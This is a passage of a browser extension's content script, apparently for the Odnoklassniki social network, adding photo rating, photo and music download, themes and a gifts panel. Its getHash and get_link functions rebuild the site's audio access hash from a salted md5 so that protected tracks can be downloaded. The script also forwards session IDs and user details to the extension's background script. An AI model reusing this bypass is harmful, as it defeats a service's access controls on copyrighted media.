	var photo_mark=doc.getElementById('hook_Block_PopLayerViewFriendPhotoRating') || null;
	if (photo_mark)
	{	
		var parent=photo_mark.parentNode;
		var rating_span=doc.getElementById('ok_photo_rating_span') || null;	
		if (!rating_span)
		{								
			var first=photo_mark.firstChild;				
			var span=create_dom('div',  parent, photo_mark, {"id":"ok_photo_rating_span"}, '');
				var div=create_dom('div', span, '', {"class":"ok_oktools_icons ok_photo_rating_on_v", "id":"ok_photo_rating_auto"}, '');
				var text=create_dom('div', span, '', {"id":"ok_photo_rating_text"}, '');									
				sendRequest({action: 'load_option', param: 'OkPhotoRating'}, function(result) {	
					div.setAttribute('ball',''+result+'');
					div.addEventListener('click', function(e) {	
						var ball=div.getAttribute('ball');
						if (ball==0)
						{					
							div.setAttribute('ball','100');
							div.classList.remove("ok_photo_rating_on");
							div.classList.remove("ok_photo_rating_off");
							div.classList.add("ok_photo_rating_on_v");
							text.textContent=language_text("ok_photo_rating_text_4");	
							var mark=photo_mark.getElementsByClassName('marks-new_ic') || null;	
							if (mark)
							{ 
								for (var m=0;m<mark.length;m++)
								{
									if (!mark[m].hasAttribute('auto'))
									{							
										mark[m].setAttribute('auto', true);
										mark[m].addEventListener('click', function(e) {
											var photo_auto=doc.getElementById('ok_photo_rating_auto') || null;
											if (photo_auto)
											{
												var ball=photo_auto.getAttribute('ball');
												if (ball=="100")
												{
													var span=e.target;
													var mark=e.target.innerText;
													if (mark=='1' || mark=='2' || mark=='3' || mark=='4' || mark=='5' || mark=='5+')
													{													
														if (confirm(language_text("ok_photo_rating_confirm", {'ocenk':mark})))
														{					
															span.setAttribute('style','background-color:green;');								
															text.textContent=language_text("ok_photo_rating_text_3");
															div.setAttribute('ball',''+mark+'');					
															photo_rating_auto(photo_mark);										
															sendRequest({action: 'save_option', param:'OkPhotoRating', text: mark}, function(data) {});		
														}
														else
														{
															e.stopImmediatePropagation();
															e.preventDefault();												
															div.setAttribute('ball','0');
															photo_rating_auto(photo_mark);
														}
													}
												}
											}
												
										});	
									}
								}
							}
						}
						else
						{
							div.setAttribute('ball','0');
							photo_rating_auto(photo_mark);
							sendRequest({action: 'save_option', param:'OkPhotoRating', text: '0'}, function(data) { });													
						}				
					});
					photo_rating_auto(photo_mark);
				});					
		}
		photo_rating_auto(photo_mark);		
	}		

	var klass=doc.getElementById('hook_Block_KlassOverPLB') || null;
	if (klass)
	{
		klass=klass.parentNode;
		if (!klass.hasAttribute('ok_photo'))
		{	
			klass.setAttribute('ok_photo', true);
			var src="";
			var photo=doc.getElementById('__plpcte_target') || null;
			if (photo)
			{
				if (!photo.hasAttribute('ok_photo'))
				{						
					photo.setAttribute('ok_photo', true);	
					var src=photo.getAttribute('src');				
				}
			}			
			var div1=create_dom('div', klass, '', {"class":"ok_photo_download"}, '');
				create_dom('div', div1, '', {"class":"ok_oktools_icons ok_photo_download_img"}, '');
				create_dom('div', div1, '', {"class":""}, language_text("od_button"));
			div1.addEventListener('click', function(e) {
				var img_name="image.jpg";				
				var pliw=doc.getElementsByClassName('photo-layer_bottom_sticky')[0] || null;	
				if (pliw)
				{
					if (!pliw.hasAttribute('ok_photo'))
					{							
						pliw.setAttribute('ok_photo', true);	
						var uin=pliw.getElementsByClassName('ucard_info_name')[0] || null;
						var user_name=uin.innerText;
						var uaii=pliw.getElementsByClassName('photo-layer_album')[0] || null;
						var albom_name=uaii.innerText;
						var pld=pliw.getElementsByClassName('photo-layer_date')[0] || null;
						var photo_date=pld.innerText;
						img_name=''+user_name+' ('+albom_name+') '+photo_date+'.jpg';
						img_name=img_name.replace(/[^a-z,0-9,A-Z,а-я, А-Я, ,\-,(,),.,\,,\—,\–]/gi,"");
					}
				}
				chrome.runtime.sendMessage({action: "Download", url: "http:"+src+"", name: img_name}, function(response) {});	
			}, true);
		}
	}  
}
function get_user_name()
{
	var cnf_user=doc.getElementById('hook_Cfg_CurrentUser') || null;
	if (cnf_user) 
	{ 
		var user_value=cnf_user.innerHTML;
		js_user_value=user_value.replace(/<!--/, '');
		js_user_value=js_user_value.replace(/-->/, '');
		var data=JSON.parse(js_user_value);
		user[0].uid=data['oid'];
		user[0].uid1=data['uid'];
		user[0].firstname=data['firstName'];
		user[0].lastname=data['lastName']; 
		user[0].male=data['male'];
		user[0].custlink=data['custLink'];		
		user_load();
	}	
}

function getHash(src, magic)
{
	if(!magic)
		magic = [4,3,5,6,1,2,8,7,2,9,3,5,7,1,4,8,8,3,4,3,1,7,3,5,9,8,1,4,3,7,2,8];

	var a = [];
	for(var i = 0; i < src.length; i++)
	{
		a.push(parseInt('0x0' + src.charAt(i)));
	}

	src = a;

	var res = [];
	src = src.slice(0);
	src[32] = src[31];
	var sum = 0;
	var i = 32;
	while(i-- > 0)
		sum += src[i];

	for(x = 0; x < 32; x++)
		res[x] = Math.abs(sum - src[x + 1] * src[x] * magic[x]);

	return res.join('');
}
function get_link(id, data, download, st, clientHash)
{			
	if (audio_arr[id][0].url=="")
	{
		if(clientHash === undefined)
		{
			var md5 = data.play.match(/(?:\?|&)md5=([\da-f]{32})/i);
			if(md5 && md5.length > 1)
			{
				md5 = md5[1];
				try
				{
					md5 = fun_md5(md5 + 'secret');	
					var hash=getHash(md5, false);
					get_link(id, data, download, st, hash);				
					return;
				}
				catch(err)
				{
				}
			}
		}
		else
		{
			audio_arr[id][0].url = data.play + (clientHash ? '&clientHash=' + clientHash : '');
			audio_arr[id][0].artist = data.track.ensemble;
			audio_arr[id][0].song = data.track.name;
			audio_arr[id][0].duration = data.track.duration;
			get_size(id, data, st);				
			var down_span=doc.getElementById('ok_audio_'+id+'_down') || null;
			if (down_span)
			{			
				var filename=get_filename(id);
				down_span.setAttribute('download', ''+filename+'');				
				down_span.setAttribute('href', ''+audio_arr[id][0].url+'');	
				down_span.setAttribute('style', 'opacity: 1;  filter: alpha(opacity=100);');						
				if (download)
				{	         
					chrome.runtime.sendMessage({action: "Download", url: audio_arr[id][0].url, name: ""+filename+""}, function(response) {});					
				}
				else
				{
					if (user[0].save_audio==1)
					{
						sendRequest({action: 'save_audio', info:audio_arr[id][0], jsessionid:audio.jsessionid, user:user});	
					}
				}
			}	
		}
	}
	else
	{
		get_size(id, '', st);
		var down_span=doc.getElementById('ok_audio_'+id+'_down') || null;
		if (down_span)
		{			
			var filename=get_filename(id);
			down_span.setAttribute('download', ''+filename+'');				
			down_span.setAttribute('href', ''+audio_arr[id][0].url+'');	
			down_span.setAttribute('style', 'opacity: 1;  filter: alpha(opacity=100);');
			if (download)
			{	         
				chrome.runtime.sendMessage({action: "Download", url: audio_arr[id][0].url, name: ""+filename+""}, function(response) {});
			}			
		}	
	}
}
function audio_check_size(inc,size)
{
	if ((size!=0) || (inc==0))
	{
		if (inc=="+")
		{
			music_download.file++;
			music_download.size=music_download.size+parseInt(size);
			music_download.mb=(music_download.size / 1048576.0).toFixed(1);
		}
		else if (inc=="-")
		{
			music_download.file--;
			music_download.size=music_download.size-parseInt(size);
			music_download.mb=(music_download.size / 1048576.0).toFixed(1);
		}
		else if (inc=="0")
		{
			music_download.file=0;
			music_download.size=0;
			music_download.mb=0;
		}
		var omss=doc.getElementById('ok_menu_save_size') || null;
		if (omss)
		{	
			omss.innerText=''+music_download.mb+'';
		}
		var omsf=doc.getElementById('ok_menu_save_file') || null;
		if (omsf)
		{			
			omsf.innerText=''+music_download.file+'';
			if (music_download.file>25)
			{
				omsf.setAttribute('style', 'font-weight:bold;color:red !important;');
			}
			else
			{
				omsf.setAttribute('style', 'font-weight:bold;');
			}
			doc.getElementById('ok_menu_save_file_title').innerText=declOfNum(music_download.file,['песня','песни','песен']);			
		}
	}
}

function get_size(id, data, st)
{	
	var size_text=0;
	if (audio_arr[id][0].size==0)
	{
		audio_arr[id][0].size=data.track.size;
	}	
	if (st)
	{	
		audio_check_size("+", audio_arr[id][0].size);		
	}
	var size_mb = (audio_arr[id][0].size / 1048576).toFixed(1);
	var bitrate = ((audio_arr[id][0].size * 8) / audio_arr[id][0].duration / 1000).toFixed();
	var duration=doc.getElementById('ok_audio_'+id+'_dur') || null;
	if (duration)
	{
		create_dom('span', duration, '', {"style":"font-weight: bold", "title":""+language_text("OD_size_1")+" "+size_mb+" "+language_text("OD_size_2")+""}, ""+size_mb+" "+language_text("OD_size_2")+" / "); 
		create_dom('span', duration, '', {"style":"font-weight: bold", "title":""+language_text("OD_bitrate_1")+" "+bitrate+" "+language_text("OD_bitrate_2")+""}, ""+bitrate+" "+language_text("OD_bitrate_2")+""); 
		duration.setAttribute('style', 'background-color:#292929;');
	}	
}
function get_filename(id)
{
	var filename='no name';
	if (audio_arr[id][0].artist=="")
	{
		if (audio_arr[id][0].song=="")
		{
			var filename='no name';
		}
		else
		{
			var filename=''+audio_arr[id][0].song+'';
		}
	}
	else
	{
		if (audio_arr[id][0].song=="")
		{
			var filename=''+audio_arr[id][0].artist+'';
		}
		else
		{
			var filename=''+audio_arr[id][0].artist+' - '+audio_arr[id][0].song+'';
		}
	}
	filename=''+filename+'.mp3';
	return filename;
}
function audio_size_load(mod, id)
{	
	sendRequest({action: 'get_size', id: id, mod:mod, start:0, count:600, jsessionid:audio.jsessionid}, function(data) {
		if (data.tracks)
		{
			//console.log('size_mod|'+mod+'|'+id+'|'+data.tracks.length+'');		
			for (var d=0;d<data.tracks.length;d++)
			{				
				audio_arr[''+data.tracks[d].id+''] = new Array({"id":""+data.tracks[d].id+"","url":"","size":""+data.tracks[d].size+"","artist":""+data.tracks[d].ensemble+"","song":""+data.tracks[d].name+"","duration":""+data.tracks[d].duration+""});
			}	
		}
		else
		{
			//console.log('size_mod|ERROR tracks');
		}
	});
}
function audio_get_size(id, download, st)
{		
	if(!!audio.jsessionid)
	{
		if (audio_arr[id][0].size==0)
		{		
			sendRequest({action: 'get_size', id: id, mod:'file', start:0, count:0, jsessionid:audio.jsessionid}, function(data) {
				if (data.error)
				{
					console.log('DOWNLOAD ERROR: '+data.error);					
					if (data.error=="error.notloggedin")
					{
						var down=doc.getElementById('ok_audio_'+id+'_down') || null;
						if (down)
						{	
							if (!down.hasAttribute('error'))
							{		
								down.setAttribute('error',true);
								get_jsessionid(true);								
							}						
						}						
						
					}
					var duration=doc.getElementById('ok_audio_'+id+'_dur') || null;
					if (duration)
					{
						if (!duration.hasAttribute('error'))
						{		
							duration.setAttribute('error',true);
							create_dom('span', duration, '', {"style":"font-weight: bold"}, "Файл защищен"); 
							duration.setAttribute('style', 'background-color:red;');
						}
					}					
				}
				else
				{
					get_link(id, data, download, st);
				}
			});				
		}
		else
		{
			get_link(id, '', download, st);
		}
	}
	else
	{
		if (audio.error<10)
		{
			console.log('OKTOOLS:jsessionid ПАРАМЕТР НЕ НАЙДЕН! ПОПЫТКА ['+audio.error+']');			
			get_jsessionid(true);			
		}
		else if (audio.error==10)
		{
			var isReport=confirm(language_text("OkAudio_error"));
			if (isReport)
			{
				var result_jssesion=get_jsessionid(true);	
				var href=encodeURIComponent(window.document.location.href);				
				sendRequest({action: 'report_error', user:user, href:href, type:'jsessionid', error:result_jssesion}, function(data) {					
					if (data.data.result)
					{
						alert(data.data.message);
					}
				});
			}			
		}
		audio.error++;
	}	
	
}

function array_lenght(arr)
{
	var lenght=0;
	for (var key in audio_arr) {
		lenght++;
	}
	return lenght;
}
function array_first_key(arr)
{
	var lenght=0;
	for (var key in audio_arr) {
		if (lenght==0)
		{
			var retkey=key;
		}
		lenght++;
	}
	return retkey;
}
function music_checkbox(check, pokaz)
{		
	var audio_check=doc.getElementsByClassName('ok_save_all_checkbox') || null;
	if (audio_check.length>0)
	{  				
		for (var d=0;d<audio_check.length;d++)
		{ 			
			var parent_el=audio_check[d].parentNode.parentNode.parentNode;
			if (pokaz)
			{
				parent_el.classList.add('ok_checkbox');
				if (check)
				{		
					var id=audio_check[d].getAttribute("mid");
					audio_get_size(id, false, true);
					audio_check[d].setAttribute('checked', true);
					audio_check[d].classList.add('check');
				}
				else
				{
					audio_check[d].removeAttribute('checked');
					audio_check[d].classList.remove('check');
				}					
			}
			else
			{
				parent_el.classList.remove('ok_checkbox');
				if(!check)
				{
					audio_check[d].removeAttribute('checked');
					audio_check[d].classList.remove('check');					
				}
			}
			
		}
		var download_as=doc.getElementById('ok_menu_audio_size') || null;
		if (download_as)
		{	
			if (pokaz)
			{			
				download_as.setAttribute('style','display:block');
			}
			else
			{
				download_as.setAttribute('style','display:none');
				audio_check_size("0", 0);	
			}
		}
		if (!check)
		{
			audio_check_size("0", 0);					
		}
	}	
}
function audio_add_link(elem, id, pokaz)
{		
	elem.classList.add('__download');
	
	var mus_tr=elem.getElementsByClassName('mus-tr_hld')[0] || null;
	if (mus_tr)
	{
		var elem4=mus_tr.getElementsByClassName('mus-tr_cnt')[0] || null;	
		var a=create_dom('a', mus_tr, elem4, {"class":"ok_oktools_icons ok_audio_download", "id":"ok_audio_"+id+"_down", "title":""+language_text("OD_save_button")+""}, '');		
		if (pokaz)
		{
			elem.classList.add('ok_checkbox');	
			
		}
			var checkbox_div=create_dom('span', mus_tr, elem4, {"class":"ok_audio_check", "id":"ok_audio_"+id+"check","tid":""+id+""}, '');
				var span=create_dom('span', checkbox_div, '', {"mid":""+id+"","class":"ok_oktools_icons ok_save_all_checkbox"}, '');
				span.addEventListener('click', function(e) {
					var sp=e.target;
					var id=sp.getAttribute('mid');
					if (sp.hasAttribute('checked'))
					{		
						sp.removeAttribute('checked');
						sp.classList.remove('check');
						audio_check_size("-", audio_arr[id][0].size);						
					}
					else
					{				
						sp.setAttribute('checked', true); 
						sp.classList.add('check');						
						audio_get_size(id, false, true);						
					}				
				});
		
		if (audio_arr[id])
		{
			var duration=doc.getElementById('ok_audio_'+id+'_dur') || null;
			if (duration)
			{
				duration.parentNode.removeChild(duration);
			}
			create_dom('span', mus_tr, '', {"class":"ok_audio_size ellip", "id":"ok_audio_"+id+"_dur"}, '');		
		
			if (audio_arr[id][0].size!=0)
			{		
				
				a.setAttribute('href', ''+audio_arr[id][0].url+'');	
				a.setAttribute('download', ''+get_filename(id)+'');			
				a.setAttribute('style', 'opacity: 1;  filter: alpha(opacity=100);');
				if (audio_arr[id][0].url=="")
				{
					a.addEventListener('mouseover', function() {audio_get_size(id, false, false);}, true);
				}			
				a.addEventListener('click', function(e) {download_file(e);}, true);				
				get_size(id, '', false);					
			}
			else		
			{
				a.setAttribute('href', '');			
				a.setAttribute('download', ''+get_filename(id)+'');
				a.setAttribute('style', 'opacity: .6;  filter: alpha(opacity=60);');
				a.addEventListener('mouseover', function() {audio_get_size(id, false, false);}, true);
				a.addEventListener('click', function(e) {download_file(e);}, true);
			}
		}
		else
		{
			create_dom('span', mus_tr, '', {"class":"ok_audio_size ellip", "id":"ok_audio_"+id+"_dur"}, '');		
			audio_arr[''+id+''] = new Array({"id":""+id+"","url":"","size":"0","artist":"","song":"","time":"0"});
			a.setAttribute('href', '');
			a.setAttribute('download', '');
			a.setAttribute('style', 'opacity: .5;  filter: alpha(opacity=50);');				
			a.addEventListener('mouseover', function() {audio_get_size(id, false, false);}, true);	
			a.addEventListener('click', function(e) {download_file(e);}, true);
		}	
	}		
}
function audio_add(el,pokaz)
{
	if (!el.hasAttribute('ok_audio_save'))
	{		
		el.setAttribute('ok_audio_save', true);
		if (el.hasAttribute('data-query'))
		{
			var data_query=el.getAttribute('data-query');					
			if (data_query.length>5)
			{		
				var id=data_query.match(/(trackid\":(\d+))/i);			
				if (id.length>1)
				{										
					audio_add_link(el, id[2], pokaz);	
				}
			}   
		}
		else
		{
			var radio_search=el.getElementsByClassName('mus-tr_play')[0] || null;
			if (radio_search)
			{ 						
				if (radio_search.hasAttribute('data-id'))
				{
					var id=radio_search.getAttribute('data-id');
					audio_add_link(el, id, pokaz);
				}
			}
		}	
	}
}
function audio_search(el)
{     		
	var pokaz=false
	var check=doc.getElementById('ok_menu_save_but_check') || null;
	if (check)
	{	
		if (check.hasAttribute('check'))
		{
			check.removeAttribute('check');
		}
	}
	var download_as=doc.getElementById('ok_menu_audio_size') || null;
	if (download_as)
	{			
		download_as.setAttribute('style','display:none');
		audio_check_size("0", 0);
	}
	var audio_search=el.getElementsByClassName('mus-tr_i') || null;
	if (audio_search.length>0)
	{  							
		//console.log('MUS leght|'+audio_search.length);			
		for (var d=0;d<audio_search.length;d++)
		{  		        
			audio_add(audio_search[d], false);
		}		
	}				
	var parent=el.parentNode;	 
	if (!parent.hasAttribute('ok_audio_menu'))
	{
		parent.setAttribute('ok_audio_menu', true);				
		var div=create_dom('div', parent, '', {"class":"ok_menu_audio_save"}, '');
			var but=create_dom('div', div, '', {"class":"ok_menu_btn_save btn_green vl_btn"}, '');
				create_dom('span', but, '', {}, language_text('od_button'));					
				var div1=create_dom('div', but, '', {"class":"ok_menu_save"}, '');
					var div2=create_dom('div', div1, '', {"id":"ok_menu_save_but_check"}, language_text('OD_button_1'));
						div2.addEventListener('click', function() {									
							if (!div2.hasAttribute('check'))
							{
								div2.setAttribute('check',true);
								music_checkbox(false, true);
							}
							else
							{
								div2.removeAttribute('check');
								music_checkbox(false, false);
							}	
						}, true);			
					var div3=create_dom('div', div1, '', {}, language_text('OD_button_2'));
						div3.addEventListener('click', function() {music_checkbox(true,true);}, true);
					var div4=create_dom('div', div1, '', {}, language_text('OD_button_3'));
						div4.addEventListener('click', function() {music_checkbox(false,true);}, true);
					var div5=create_dom('div', div1, '', {}, language_text('OD_button_4'));
					div5.addEventListener('click', function() { 
						if (music_download.file>25)
						{
							if (confirm(language_text('ok_audio_message'))) 
							{
								save_all('browser');
							}
						} 
						else 
						{
							save_all('browser');
						}
					}, true);
			var div1=create_dom('div', div, '', {"id":"ok_menu_audio_size","style":"display:none"}, '');
				create_dom('span', div1, '', {}, 'Выбрано:');
				create_dom('span', div1, '', {"id":"ok_menu_save_file","style":"font-weight:bold;"}, '0');
				create_dom('span', div1, '', {"id":"ok_menu_save_file_title"}, 'файлов');
				create_dom('span', div1, '', {"id":"ok_menu_save_size","style":"font-weight:bold;"}, '0');
				create_dom('span', div1, '', {}, 'МБ');
		
	}		
}
function declOfNum(number, titles)  
{  
    cases = [2, 0, 1, 1, 1, 2];  
    return titles[(number%100>4 && number%100<20)? 2 : cases[(number%10<5)?number%10:5]];  
} 

function save_all(action)
{
	var check=0;
	var check_search=doc.getElementsByClassName('ok_save_all_checkbox') || null;
	if (check_search)
	{  	
		for (var cs=0;cs<check_search.length;cs++)
		{ 
			if (check_search[cs].hasAttribute('checked'))
			{
				check++;
				var id=check_search[cs].getAttribute('mid');
				audio_get_size(id, true, false);
			}
		}
	}
	if (check==0)
	{
		alert(language_text('OD_message_1'));
	}
}
function get_jsessionid(reload)
{
	if((!audio.jsessionid) || (reload))
	{
		var content_var=get_content_var();
		sendRequest({action: 'get_jsses', token:content_var.token, gwt:content_var.gwtHash}, function(data) { 			
			if (data.sid)
			{
				audio.jsessionid=data.sid;
				console.log('OKTOOLS:jsessionid ['+audio.jsessionid+']');
			}
			else
			{		
				console.log('OKTOOLS:jsessionid ERROR ['+data.error+']');
				return data.error;
			}
		});
	}
}
function friend_theme(guid)
{
	//console.log('FRIEND THEME|'+guid+'|'+user[0].uid);
	if (user[0].uid!=guid)
	{			
		sendRequest({action: 'load_option', param: 'OkGuestTheme'}, function(result) { 
			if (result)
			{				
				sendRequest({action: 'get_theme', id: '0', guid:guid, ok_id:'0', user:user}, function(data) {
					if(data.result)
					{						
						get_theme(data);
						var covers_control_anim=doc.getElementsByClassName("covers_control_anim")[0] || null;
						if(covers_control_anim)
						{
							clear_html(covers_control_anim);
							var a=create_dom('a', covers_control_anim, '', {"class":"covers_control_cnt_w al"}, '');
								create_dom('div', a, '', {"class":"covers_control_ic"}, '');
								create_dom('div', a, '', {"class":"covers_control_cnt"}, language_text("ok_theme_ust_2"));
							a.addEventListener('click', function(e) {
								sendRequest({action: 'get_theme', id: data.id, guid:'0', ok_id:'0', user:user}, function(style) {
									alert(language_text("ok_theme_ust_3"));		
								}, false);							
							}); 
						}
					}
					else
					{
						load_theme();
					}	
				}, false);	
			}
			else
			{
				load_theme();
			}
		}, false);			
	}
	else 
	{
		load_theme();
	}

}
function load_gifts(el, id, gift_id, anim, is_user, title, c)
{
	var lst=doc.getElementById('hook_Block_BodySwitcher') || null;
	if (lst)
	{			
		var og=create_dom('div', lst, '', {"id":"oktools_gifts_load","style":"display:block"}, '');
		var ogd=create_dom('div', og, '', {"id":"oktools_gifts_div"}, '');
			var ogtc=create_dom('div', ogd, '', {"class":"oktools_gifts_title_content"}, '');	
				create_dom('div', ogtc, '', {"id":"oktools_gifts_title"}, ''+title+'');	
				if (is_user)
				{
					var g_del=create_dom('div', ogtc, '', {"class":"oktools_gifts_delete", "gid":""+id+""}, language_text("ok_gift_delete"));
					g_del.addEventListener('click', function(e) {
						var isOk = confirm(language_text("ok_gift_delete_confirm"));
						if(isOk)
						{
							sendRequest({action: 'gift_delete', id: id, user:user}, function(data) {					
								if (data.result)
								{
									gift_count_glob=data.count;	
									gift_count=gift_count-1;
									og.parentNode.removeChild(og);			
									el.parentNode.removeChild(el);															
									if (data.count==0)
									{
										doc.getElementById('oktools_gift_res').textContent=language_text("ok_gift_nogift");
										var gc=doc.getElementById('oktools_gift_content')|| null;
										if(gc)
										{
											var no=create_dom('div', gc, '', {"class":"oktools_gift_mess"}, '');
												create_dom('div', no, '', {}, language_text("ok_gift_nogiftuser"));
										}
										
									}
									else
									{
										doc.getElementById('oktools_gift_count').textContent=data.count;
										doc.getElementById('oktools_gift_count_new').textContent=data.count_new;
										var count_vis=doc.getElementById('oktools_gift_count_visible').textContent;
										doc.getElementById('oktools_gift_count_visible').textContent=parseInt(count_vis)-1;
									}
								}
							});
						}
					});
					var g_admin=create_dom('div', ogtc, '', {"class":"oktools_gifts_admin", "gid":""+id+""}, language_text("ok_gift_admin"));
					g_admin.addEventListener('click', function(e) {
						var content=doc.getElementById('oktools_gifts_content') || null;
						if (content)
						{
							clear_html(content);												
							create_dom('iframe', content, '', {"id":"oktools_iframe_gifts","height":"500px","width":"1000px","frameborder":"0","style":"z-index:2;margin:0px; padding:0px;","src":"//oktools.ru/page/gift_admin.php?gid="+id+"&gift_id="+gift_id+"&uid="+user[0].uid+"&hash="+user[0].hash+"&browser="+user[0].browser+"&version="+user[0].version+""}, '');	
							doc.getElementById('oktools_gifts_title').textContent=language_text("ok_gift_admin");	
						}
					});
				}					
				var ogc=create_dom('div', ogtc, '', {"class":"oktools_gifts_close ok_button btn_red"}, language_text("ok_pozd_add_close"));						
				create_dom('div', ogtc, '', {"style":"clear:both;"}, '');	
			var ogco=create_dom('div', ogd, '', {"class":"oktools_gifts_content", "id":"oktools_gifts_content"}, '');
			if (anim==1)
			{
				create_dom('embed', ogco, '', {"id":"livepresent-flash","style":"height:500px;width:1000px;visibility: visible;","class":"present-live-flash","src":"//dp.mycdn.me/getImage?photoId="+gift_id+"&type=5", "type":"application/x-shockwave-flash"}, '');
				create_dom('iframe', ogco, '', {"id":"oktools_iframe_gifts","height":"0px","width":"0px","frameborder":"0","style":"z-index:2;margin:0px; padding:0px;","src":"//oktools.ru/page/gift_load.php?gid="+id+"&gift_id="+gift_id+"&uid="+user[0].uid+"&hash="+user[0].hash+"&browser="+user[0].browser+"&version="+user[0].version+""}, '');
			}
			else if (anim==0)
			{
				create_dom('iframe', ogco, '', {"id":"oktools_iframe_gifts","height":"500px","width":"1000px","frameborder":"0","style":"z-index:2;margin:0px; padding:0px;","src":"//oktools.ru/page/gift_load.php?gid="+id+"&gift_id="+gift_id+"&uid="+user[0].uid+"&hash="+user[0].hash+"&browser="+user[0].browser+"&version="+user[0].version+""}, '');	
			}
			else
			{
				create_dom('iframe', ogco, '', {"id":"oktools_iframe_gifts","height":"500px","width":"1000px","frameborder":"0","style":"z-index:2;margin:0px; padding:0px;","src":"//oktools.ru/page/gift_admin.php?gid="+id+"&gift_id="+gift_id+"&uid="+user[0].uid+"&hash="+user[0].hash+"&browser="+user[0].browser+"&version="+user[0].version+""}, '');			
			}
			ogc.addEventListener('click', function(e) {
				og.parentNode.removeChild(og);
			});	
			if (is_user)
			{			
				var gift_preview=doc.getElementById("oktools_gift_"+id+"") || null;
				if(gift_preview)
				{
					var cp=gift_preview.getAttribute("class");
					if(/gift_new/i.test(cp))
					{	
						gift_preview.setAttribute("class","oktools_gift_item");
						var count_new=doc.getElementById('oktools_gift_count_new').innerText;
						doc.getElementById('oktools_gift_count_new').innerText=parseInt(count_new)-1;								
					}
				}								
			}			
	}
}
function load_gift_content(data, lim, is_user, d2, GiftAvatar)
{
	var limit=lim-1;
	for (var i=0;i<data.gifts.length;i++)
	{
		last_gid=data.gifts[i].id;
		if(i>limit)
		{
			var gift_class="oktools_gift_unvis";
		}
		else
		{
			var gift_class="";
		}
		if (GiftAvatar)
		{
			var d0 = new Date(data.gifts[i].date);
			var d1 = new Date();
			var DayOfDate = Math.round((d1.getTime() - d0.getTime()) / (1000*60*60*24));
			if (DayOfDate<=15)
			{
				var GiftAvaImg=create_dom('img', GiftAvatar, '', {"class":"oktools_ava_gift_img avagiftunvis","style":"height:56px;width:56px;","src":""+data.gifts[i].url_gift+"","gid":""+data.gifts[i].id+"","gift_id":""+data.gifts[i].gift_id+"", "uid_name":""+data.gifts[i].uid_name+"", "anim":""+data.gifts[i].anim+""}, '');
				GiftAvaImg.addEventListener('click', function(e) {
					var el=this;
					var aid=this.getAttribute('gid');
					var agift_id=this.getAttribute('gift_id');
					var aname=this.getAttribute('uid_name');
					var aanim=this.getAttribute('anim');							
					if (aanim==1)
					{
						var title=""+language_text('ok_gift_livetitle')+" "+aname+""
					}
					else
					{
						var title=""+language_text('ok_gift_nolivetitle')+" "+aname+""
					}
					load_gifts(el, aid, agift_id, aanim, is_user, title);
				});
			}
		}		
		if(data.gifts[i].view==0)
		{
			var itm=create_dom('div', d2, '', {"id":"oktools_gift_"+data.gifts[i].id+"","class":"oktools_gift_item gift_new "+gift_class+"","gid":""+data.gifts[i].id+"","gift_id":""+data.gifts[i].gift_id+"", "uid_name":""+data.gifts[i].uid_name+"", "anim":""+data.gifts[i].anim+""}, '');
		}
		else
		{
			var itm=create_dom('div', d2, '', {"id":"oktools_gift_"+data.gifts[i].id+"","class":"oktools_gift_item "+gift_class+"","gid":""+data.gifts[i].id+"","gift_id":""+data.gifts[i].gift_id+"", "uid_name":""+data.gifts[i].uid_name+"", "anim":""+data.gifts[i].anim+""}, '');
		}								
		create_dom('img', itm, '', {"style":"height:56px;width:56px;","src":""+data.gifts[i].url_gift+""}, '');		
		itm.addEventListener('click', function(e) {
			var el=this;
			var aid=this.getAttribute('gid');
			var agift_id=this.getAttribute('gift_id');
			var aname=this.getAttribute('uid_name');
			var aanim=this.getAttribute('anim');							
			if (aanim==1)
			{
				var title=""+language_text('ok_gift_livetitle')+" "+aname+""
			}
			else
			{
				var title=""+language_text('ok_gift_nolivetitle')+" "+aname+""
			}
			load_gifts(el, aid, agift_id, aanim, is_user, title);
		});
	}
}
function load_user_gift(guid)
{	
	var is_user=false;	
	if (guid==user[0].uid)
	{
		is_user=true;
	}
	last_gid=0;
	gift_count_glob=0;
	gift_count=0;
	var Slider;
	if(is_user)
	{
		var hbcc=doc.getElementById("hook_Block_MiddleColumnTopCardUser") || null;
	}
	else
	{
		var hbcc=doc.getElementById("hook_Block_MiddleColumnTopCardFriend") || null;
	}
		var d=create_dom('div', hbcc, '', {"class":"oktools_gift_div"}, '');
			var d1=create_dom('div', d, '', {"class":"oktools_gift_main"}, language_text('ok_gift_title'));
				var d4=create_dom('div', d1, '', {"id":"oktools_gift_res"}, '');
			var d2=create_dom('div', d, '', {"id":"oktools_gift_content", "class":"oktools_gift_content"}, '');	
			var d3=create_dom('div', d, '', {"class":"oktools_gift_content"}, '');
				var sd=create_dom('a', d1, '', {"style":"float:right;font-family: Arial,Helvetica,sans-serif;font-size: 12px;","class":"tico","href":"/dk?st.cmd=giftsFront&st.or=FRIEND_MENU&st.friendId="+guid+"&st._aid=FriendTopCardButtonsSendPresent"}, language_text('ok_gift_addgift'));
				create_dom('i', sd, '', {"class":"tico_img ic ic_present"}, '');
			sendRequest({action: 'gift_load', guid: guid, last:last_gid, user:user}, function(data) {	
				if (data.result)
				{
					//console.log(data);
					var limit=parseInt(data.limit);
					gift_count_glob=parseInt(data.count);
					if (gift_count_glob>=limit)
					{
						gift_count=limit;
					}
					else
					{
						gift_count=gift_count_glob;
					}	
					create_dom('span', d4, '', {"id":"oktools_gift_count_visible","style":"color:green;font-size:14px;"}, ''+gift_count+'');
					create_dom('span', d4, '', {}, ' '+language_text('ok_gift_titleiz')+' ');
					create_dom('span', d4, '', {"id":"oktools_gift_count","style":"color:green;font-size:14px;"}, ''+data.count+'');
					create_dom('span', d4, '', {"id":"oktools_gift_count_new","style":"color:green;font-size:14px;margin-left:10px;"}, ''+data.count_new+'');
					create_dom('span', d4, '', {}, ' '+language_text('ok_gift_titlenew')+'');	
					if (is_user)
					{										
						var g_admin=create_dom('span', d4, '', {"class":"oktools_gifts_admin_main", "gid":"0"}, language_text("ok_gift_admin"));
						g_admin.addEventListener('click', function(e) {
							load_gifts(this, '0', '0', '3', true, language_text("ok_gift_admin"));						
						});	
					}
					var GiftAvatar=false;
					var posting_href=doc.querySelectorAll('div.lcTc_avatar') || null;
					if (posting_href && posting_href.length!=0)
					{							
						for (var h=0;h<posting_href.length;h++)
						{  		
							var GiftAvatar=create_dom('div', posting_href[h], '', {"class":"oktools_ava_gifts","draggable":"true"}, '');							
						}	
					}		
					load_gift_content(data, limit, is_user, d2, GiftAvatar);					
					var sl=gifts_slider(GiftAvatar, 0);
					if (sl>1)
					{
						var k=1;					
						window.setInterval(function(){											
							var sl=gifts_slider(GiftAvatar, k);						
							k++;
